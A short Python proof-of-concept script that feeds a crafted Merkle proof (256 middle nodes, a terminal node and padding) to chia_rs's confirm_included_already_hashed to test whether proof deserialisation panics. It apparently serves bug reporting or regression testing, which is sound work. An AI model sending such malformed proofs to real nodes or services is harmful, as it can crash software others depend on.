import chia_rs
import hex_literal

# A malicious proof that uses exactly 256 MIDDLE nodes
# Each MIDDLE node is 1 byte (0x02)
# Followed by a TERMINAL node (0x01) and its 32-byte hash
# Followed by 256 EMPTY nodes (0x00) to complete the structure

proof = b"\x02" * 256 + b"\x01" + b"\x00" * 32 + b"\x00" * 256
root = bytes.fromhex("60762955f242d99d903f56b06e931494df3303d7c37e002999d924d942f27660")
item = b"\x00" * 32

print("Attempting to validate malicious proof (this should not panic)...")
try:
    # This uses the public API from the python wheel
    # It will reach MerkleSet::from_proof -> deserialize_proof_impl -> generate_proof -> generate_proof_impl
    result = chia_rs.confirm_included_already_hashed(proof, item, root)
    print(f"Validation result: {result}")
except Exception as e:
    print(f"Validation failed as expected or with error: {e}")

print("PoC completed.")
